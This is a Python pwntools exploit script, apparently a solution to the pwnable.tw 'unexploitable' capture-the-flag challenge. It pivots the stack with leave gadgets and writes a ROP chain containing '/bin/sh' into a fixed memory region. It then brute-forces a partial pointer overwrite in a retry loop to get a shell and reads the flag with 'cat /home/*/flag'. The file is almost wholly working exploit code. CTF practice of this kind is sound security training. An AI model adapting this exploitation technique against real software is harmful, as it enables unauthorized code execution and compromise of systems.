#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright Â© 2018 hzshang <hzshang15@gmail.com>
from random import randint
from pwn import *
context.log_level="debug"
pwn_file="./unexploitable"

def exploite():
    if len(sys.argv)==1:
        conn=process(pwn_file)
        pid=conn.pid
    else:
        conn=remote("chall.pwnable.tw",10403)
        #conn=remote("work",4444)
        pid=0
    # build a new stack,
    # use leave to control esp
    sleep(3)
    rop=""
    rop+="a"*0x10
    rop+=p64(0x601030)# new rbp
    rop+=p64(0x40055B)
    sleep(0.5)
    conn.sendline(rop)
    # write data to 0x601020
    f={
        0x0:p64(0x601050),
        0x8:p64(0x40055B),
        0x10:p64(0x601020),
        0x18:p64(0x40055B),
        0x30:p64(0x601050),
        0x38:p64(0x4005F0),
        0x58:p64(0x601010),
        0x60:p64(0x6010a8),
        0x68:p64(0),
        0x70:p64(0),
        0x78:p64(0x4005d0),
        0x88:"/bin/sh\x00",
    }
    rop=fit(f,filler="\x00",length=0x100)
    sleep(0.5)
    conn.send(rop)
    sleep(0.5)
    
    def random_byte():
        byte=chr((randint(0,0xf)*0x10+0xb))
        return "\xc0"+byte
    conn.send(random_byte())
    sleep(0.5)
    conn.send("1")
    try:
        conn.sendline("cat /home/*/flag")
        data=conn.recv()
        print "flag: ",data
        ret=True
    except Exception as e:
        ret=False
        conn.close()
    finally:
        return ret

if __name__ == "__main__":
    
    while not exploite():
        pass








